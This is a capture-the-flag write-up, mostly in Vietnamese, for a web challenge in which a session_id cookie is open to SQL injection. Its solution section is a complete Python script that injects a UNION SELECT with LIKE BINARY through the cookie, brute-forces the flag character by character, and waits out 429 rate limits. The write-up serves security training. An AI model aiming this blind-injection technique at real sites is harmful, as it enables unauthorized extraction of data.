SQL 2.0
===
**Category:** Web

### Description
- You cant get what you inject. ;) chall.codefest.tech:5000 someone exported this dump
- File : `dump.txt`

### Overview
- Đầu tiên truy cập website thì chúng ta thấy được một giao diện khá bình thường không có gì đặc sắc và cũng như không có nơi để chúng ta input vào. Kiểm tra cookie thì ta thấy được có 1 cookie name là `session_id` và khi thay đổi nó bằng giá trị bất kì thì máy chủ sẽ bị 500
- Bây giờ focus vào file mà author cung cấp của chúng ta (dump.txt). Đọc file đó thì ta thấy được database có 2 bảng là `secret` và `session_id` và điều quan trọng là bảnng secret chứa flag

### Solution
- Mình thử chạy sqlmap thì nó dump được dữ liệu của database nhưng time rất lâu và mình kiểm tra query của sqlmap thì nhận thấy được nó là blind nên mình đã viết một payload như sau. Author đã config nếu như request quá nhiều thì máy chủ sẽ 429 nên ta sẽ viết một đoạn code để nếu như máy chủ bị 429 thì sẽ sleep 1 phút và sau đó tiếp tục

##### Payload

```py
import string, requests
import time,random

url = 'http://chall.codefest.tech:5000/'
flag = "codefest{"
arr_session = [
	'163d9405-64c3-4cef-9c00-89e3462beff3',
    '73e13697-8594-4791-9266-8fcc0fc583d6',
    'd71b2ab7-74e5-49fb-93ce-6e65e3f47983',
    '12cac265-615d-463a-9770-96d76085d211',
    'c850b330-86e2-4e6c-8662-9aba2c6fc310',
    'e6dbdc4f-ba52-47ae-baa3-988cb2f00f2d',
    'dedcb5ee-74f1-4671-bca1-ba0701e72e73']

session = requests.Session()

def check(text):
	print(text)
	text = text.replace('_','\\_')
	while True:
		time.sleep(1)
		session.cookies.set("session_id",f"' union select '{random.choice(arr_session)}' from secrets where type='flag' and value like binary '{text}%")
		r = session.head(url)
		if r.status_code == 429:
			time.sleep(61)
			print("reload")
		return r.ok


while True:
	for i in "_}"+string.ascii_uppercase+string.ascii_lowercase+string.digits:
		if check(flag+i):
			flag += i
			print(flag)
			break
print(flag)
```
